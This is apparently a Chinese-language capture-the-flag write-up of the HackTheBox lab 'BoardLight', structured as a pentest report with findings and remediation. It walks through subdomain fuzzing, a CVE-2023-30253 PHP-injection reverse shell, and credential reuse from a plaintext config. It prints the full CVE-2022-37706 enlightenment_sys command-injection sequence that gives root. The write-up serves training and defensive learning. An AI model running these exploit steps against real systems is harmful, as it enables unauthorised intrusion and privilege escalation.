## 1. 執行摘要 (Executive Summary)

### 測試範圍與目標：
1. 靶機名稱:BoardLight
2. 難度:Easy
3. IP:10.129.231.37

### 主要發現：
1. 漏洞 ：透過舊版本公開漏洞(CVE-2023-30253)利用驗證不嚴的管理員憑證修改注入資料中的大寫字母來執行遠端程式碼（風險等級：Critical）
2. 漏洞 ：透過舊版本公開漏洞(CVE-2022-37706)錯誤地處理了路徑名達成權限提升（風險等級：High）

### 攻擊鏈摘要：

透過子網域爆破獲得登入面板，登入面板允許管理員使用錯誤密碼以限制權限的身分登入，在控制面板中建立新網頁後繞過大小寫限制注入PHP命令達成遠端程式碼執行，獲得初始系統存取權。利用初始用戶可讀conf文件中洩漏使用者的明文密碼，達成橫向移動。利用enlightenment的舊版本公開漏洞(CVE-2022-37706)建立錯誤路徑，並成功呼叫惡意腳本，達成權限提升。


### 潛在影響：

1. 登入面板驗證不嚴，即使密碼錯誤也能登入，身份驗證機制完全失效，使攻擊者能以極低成本取得管理員身份的初步存取權。
2. 權限管控缺失，雖然限制了權限，但能透過修改大小寫字母來繞過過濾機制，使攻擊者能注入惡意程式碼獲得系統控制權。
3. 使用者密碼以明文且可讀方式儲存，將使攻擊者輕易獲得更高權限，造成嚴重資訊洩漏。
4. enlightenment的舊版本存在公開漏洞，使攻擊者能權限提升至root，造成系統全面崩潰，以及重大敏感資料外洩。


### 修復建議：

1. 登入面板採取嚴格驗證，確保後端確實比對密碼雜湊值，並在驗證失敗時立即回傳錯誤訊息，嚴禁核發任何Session或Token。
2. 對於管理員帳號，強制要求實施多因素驗證 (MFA)，以防止單一驗證機制失效。
3. 在建立網頁功能中，應嚴格過濾不必要的PHP函數，並採取規範化安全檢查前，將所有輸入統一轉為小寫或大寫。
4. 使用者密碼不該以任何方式被記錄在可讀文件中，請盡速對儲存密碼的可讀文件加密或設置權限。
5. 立即將舊版本程式更新至最新版本。

---

## 2. 技術發現與攻擊路徑詳述 (Findings)

### 2.1 資訊蒐集(Reconnaissance)

使用Nmap掃描開放埠
```bash
sudo nmap -sT -Pn --min-rate 5000 -p- 10.129.231.37
sudo nmap -sT -Pn -sV -sC -O -p22,80 10.129.231.37
sudo nmap --script=vuln -p22,80 10.129.231.37
```

<img width="717" height="213" alt="螢幕擷取畫面 2026-02-28 170918" src="https://github.com/user-attachments/assets/e92a4025-ed0a-4c1f-a717-fd8732f8d987" />
<img width="1114" height="498" alt="螢幕擷取畫面 2026-02-28 171115" src="https://github.com/user-attachments/assets/8fa863b0-dfa8-4060-aa51-b638bd4633e1" />
<img width="719" height="646" alt="螢幕擷取畫面 2026-02-28 171231" src="https://github.com/user-attachments/assets/858a2b84-9d9e-4684-8c58-bdf967ca23df" />
<img width="710" height="710" alt="螢幕擷取畫面 2026-02-28 171244" src="https://github.com/user-attachments/assets/a6bf7670-1790-4dad-bae8-0214aa1c01c2" />

探索80web主頁

<img width="1473" height="834" alt="螢幕擷取畫面 2026-02-28 170946" src="https://github.com/user-attachments/assets/924f31c8-2d6b-4248-810d-e520d91e024e" />

將網頁底部發現的URL加入/etc/hosts
```bash
sudo nano /etc/hosts
```

<img width="1232" height="475" alt="螢幕擷取畫面 2026-02-28 171259" src="https://github.com/user-attachments/assets/9f3c145c-21c6-4756-bcf0-702112fa98c8" />
<img width="505" height="238" alt="螢幕擷取畫面 2026-02-28 171406" src="https://github.com/user-attachments/assets/3d373652-c616-4354-8ae1-9bd5ee044f8a" />

### 2.2 枚舉(Enumeration)

使用gobuster爆破目錄，因原本常用的字典並未爆破出有用訊息，我更換字典又爆破了一次
```bash
sudo gobuster dir -u http://board.htb/ -w /usr/share/dirbuster/wordlists/directory-2.3-medium.txt -x php,txt
sudo gobuster dir -u http://board.htb/ -w /usr/share/wordlists/dirb/common.txt -x php,txt
```

<img width="855" height="766" alt="螢幕擷取畫面 2026-02-28 175314" src="https://github.com/user-attachments/assets/42a1efe5-f30d-43c5-8962-16ab1aab4f37" />

因目錄爆破和主頁中我均無法找到有效攻擊面，我進行子網域爆破
```bash
sudo ffuf -u http://10.129.231.37 -H "HOST: FUZZ.board.htb" -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt -mc all -ac
```
參數說明:
-u 指定IP地址
-H 自訂標頭，用於虛擬主機爆破，有別於DNS爆破，可找出隱藏在同一台伺服器內、未公開DNS的網站。
-w 指定字典，要用的時候才發現我的kali好像沒裝Seclists，緊急安裝太花時間，所以使用amass。
-mc all 匹配「所有」狀態碼，連500和404都不放過。
-ac 找出正常無效頁面的特徵，並自動過濾掉它們。

-mc all -ac 的意思就是「我要看所有的狀態碼，但只要長得跟那些『不存在的頁面』一樣的結果，通通幫我藏起來。」

<img width="1214" height="654" alt="螢幕擷取畫面 2026-02-28 181054" src="https://github.com/user-attachments/assets/acf32d49-ffae-41f2-bc79-b40941c2a553" />

將找到的子網域加入/etc/hosts/
```bash
sudo nano /etc/hosts
```

<img width="493" height="234" alt="螢幕擷取畫面 2026-02-28 181148" src="https://github.com/user-attachments/assets/70ad0332-c04a-4407-b45a-ad90722b93c7" />

瀏覽子網域

<img width="1337" height="783" alt="螢幕擷取畫面 2026-02-28 181212" src="https://github.com/user-attachments/assets/39f3779b-1a37-49ab-9718-84dd75320260" />


### 2.3 初始存取(Initial Access)

Google搜尋預設密碼和公開漏洞

<img width="963" height="667" alt="螢幕擷取畫面 2026-02-28 181633" src="https://github.com/user-attachments/assets/804e574e-db4e-4eb0-84fd-060c9e20d6b8" />
<img width="921" height="749" alt="螢幕擷取畫面 2026-02-28 181646" src="https://github.com/user-attachments/assets/819ed882-0853-4508-bf4f-613c14eb86c0" />

使用管理員預設憑證登入，權限似乎受限，但從PoC得知不影響利用公開漏洞

<img width="1886" height="539" alt="螢幕擷取畫面 2026-02-28 181658" src="https://github.com/user-attachments/assets/cb84fa65-031f-4c45-8f82-679e12c7b084" />

以下為手動利用漏洞，也可使用公開的PoC腳本

利用建立網站功能建立空的shell網頁

<img width="1445" height="500" alt="螢幕擷取畫面 2026-02-28 182003" src="https://github.com/user-attachments/assets/054adffb-58ab-4dcf-bc88-82b5cbb19291" />

網站會阻擋php

<img width="1884" height="599" alt="螢幕擷取畫面 2026-02-28 182803" src="https://github.com/user-attachments/assets/bedecf27-f2f0-4e80-be78-3133b89199f3" />

更改為大寫就可繞過

<img width="1883" height="610" alt="螢幕擷取畫面 2026-02-28 182836" src="https://github.com/user-attachments/assets/57c8e3f3-ac15-4eee-9c20-e3d971c4d22f" />

儲存後打開動態網頁選項，出現PHPinfo即是PoC成功

<img width="1736" height="730" alt="螢幕擷取畫面 2026-02-28 185245" src="https://github.com/user-attachments/assets/8acbf6d8-0e47-4dcb-b932-77f440397710" />

建立nc監聽
```bash
nc -lvnp 1234
```

<img width="340" height="93" alt="螢幕擷取畫面 2026-02-28 185305" src="https://github.com/user-attachments/assets/022f4397-5b14-435a-a7d1-d1f69c456d56" />

注入payload

<img width="1893" height="449" alt="螢幕擷取畫面 2026-02-28 185626" src="https://github.com/user-attachments/assets/dfe64381-9895-481b-9d31-7314a4a77924" />

成功獲得反彈Shell

<img width="757" height="152" alt="螢幕擷取畫面 2026-02-28 185943" src="https://github.com/user-attachments/assets/b52f4c74-bf70-45cd-8e28-1b417377b28a" />

因沒有Python，可使用script升級Shell
```bash
script /dev/null -c bash
ctrl+z
stty raw -echo; fg
reset
screen
export TERM=xterm
```

### 2.4 橫向移動(Lateral Movement)

探索conf.php文件，可得明文資料庫密碼

<img width="747" height="716" alt="螢幕擷取畫面 2026-02-28 190748" src="https://github.com/user-attachments/assets/dc078078-6f02-4609-8a2f-7b2421097f81" />

嘗試以資料庫密碼和/HOME中的使用者名稱登入SSH服務

<img width="755" height="349" alt="螢幕擷取畫面 2026-02-28 190853" src="https://github.com/user-attachments/assets/eb55b39e-8a58-4e15-9138-adc467ef2b33" />

成功獲得user.txt，並且我注意到目錄中有Desktop，可能是安裝了圖形使用者介面桌面環境的Linux機器

<img width="790" height="107" alt="螢幕擷取畫面 2026-02-28 190931" src="https://github.com/user-attachments/assets/f7de068a-afb8-4af2-a547-0137296204d0" />


### 2.5 權限提升(Privilege Escalation)

探查SUID文件
```bash
find / -perm -u=s -type f 2>/dev/null
```

<img width="821" height="402" alt="螢幕擷取畫面 2026-02-28 191230" src="https://github.com/user-attachments/assets/45bbd71c-6091-459c-a319-2283906aefa2" />

Enlightenment是一個用於Window系統的視窗管理器，它是一個Linux系統的圖形使用者介面。
存在公開漏洞以及PoC腳本


<img width="1615" height="774" alt="螢幕擷取畫面 2026-02-28 191513" src="https://github.com/user-attachments/assets/5b80b231-c9c2-47f8-bdf1-4241dc691f19" />
<img width="1300" height="831" alt="螢幕擷取畫面 2026-02-28 191835" src="https://github.com/user-attachments/assets/cfa49fad-79b9-4d5e-8657-2813fc8dbef8" />

我將使用手動執行，漏洞中存在一個調用system(cmd)，cmd是一個包含使用者輸入的字串必須使用enlightenment_sys mount特定的掛載選項和一個檔案名稱來呼叫它。

該檔案名稱用於建立一個字串，該字串會傳遞給 system，從而存在命令注入漏洞。

我依照腳本中的說法去創造路徑，以及惡意程式碼。
```bash
mkdir /tmp/net
mkdir -p "/tmp/;/tmp/exploit"
echo "/bin/bash" > /tmp/exploit
chmod +ax /tmp/exploit
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
```

<img width="1878" height="179" alt="螢幕擷取畫面 2026-02-28 192135" src="https://github.com/user-attachments/assets/013f25e7-7dd8-4663-b0fd-0284f338f518" />



### 2.6 最終成果(Impact)

獲得root.txt

<img width="1118" height="213" alt="螢幕擷取畫面 2026-02-28 192527" src="https://github.com/user-attachments/assets/b2f8b4ee-602c-4bad-b1c3-486be17fdc71" />

---


## 3. 學習回顧 (Lessons Learned)

### 成功的部分：

1. 存在的兩個公開漏洞均可以手動實現，且並未耗費太多時間。

### 浪費時間的部分：

1. 在枚舉階段沒有立刻進行子網域爆破，而是放到最後一步，有點浪費時間。

### 新知識點：

1. 關於Enlightenment漏洞的邏輯挺有趣，且[PoC](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit)中有非常詳細的說明，讓我學到不少。

### 與實戰對應：

1. 仔細觀察Home目錄中的結構，若是出現疑似桌面圖形使用者的結構，提權點可能出現在視窗管理器裡，因為這種東西不常被更新。
